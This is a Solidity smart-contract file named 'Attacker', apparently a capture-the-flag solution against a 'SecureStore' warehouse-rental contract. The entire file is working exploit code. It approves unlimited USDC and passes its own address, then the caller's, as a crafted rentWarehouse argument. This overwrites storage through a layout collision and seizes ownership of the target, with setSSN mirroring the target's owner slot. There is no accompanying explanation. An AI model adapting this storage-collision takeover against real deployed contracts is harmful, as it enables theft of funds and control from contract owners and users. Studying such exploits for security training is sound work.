// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISecureStore {
    function owner() external view returns (address);
    function rentWarehouse (uint256, uint256) external payable;
    function pricePerDay() external view returns (uint256);
}

contract Attacker {
    
    address public warehouse;
    address public owner;
    address public USDC;

    constructor(address _USDC) {
        USDC = _USDC;
    }

    function changeRegistryAddress(ISecureStore target) external {
        IERC20(USDC).approve(address(target), type(uint256).max);
        target.rentWarehouse(1, uint256(uint160(address(this))));
    }

    function changeOwner(ISecureStore target) external {
        target.rentWarehouse(1, uint256(uint160(msg.sender)));
    }

    function setSSN(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}